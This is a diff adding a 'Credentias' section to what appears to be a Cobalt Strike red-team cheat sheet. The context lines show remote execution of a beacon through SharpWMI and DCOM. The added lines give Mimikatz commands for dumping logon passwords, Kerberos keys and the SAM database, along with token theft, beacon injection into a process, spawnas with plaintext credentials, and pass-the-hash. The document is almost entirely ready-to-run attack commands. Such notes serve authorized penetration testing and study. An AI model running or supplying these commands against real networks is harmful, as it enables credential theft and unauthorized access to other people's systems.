@@ -110,3 +110,55 @@ execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Wi
 ```
 powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
 ```
+
+### Credentias
+#### Mimikatz logonpasswords
+```
+mimikatz sekurlsa::logonpasswords
+```
+
+#### Mimikatz ekeys
+```
+mimikatz sekurlsa::ekeys
+```
+
+#### Mimikatz sam
+```
+mimikatz lsadump::sam
+```
+
+#### Make token - runas other user
+```
+make_token <DOMAIN>\<USER> <PASSWORD>
+```
+
+#### rev2self
+- Undo the make token
+```
+rev2self
+```
+
+#### Steal token
+```
+steal_token 3320
+````
+
+#### Inject payload into process
+```
+inject 3320 x64 tcp-4444-local
+inject <PID> <ARCH> <BEACON>
+```
+
+#### Spawnas
+- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
+- Must be run from a folder the user has access to.
+- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
+```
+spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
+```
+
+#### Pass the hash
+```
+pth <DOMAIN>\<USER> <NTLM HASH>
+```
+
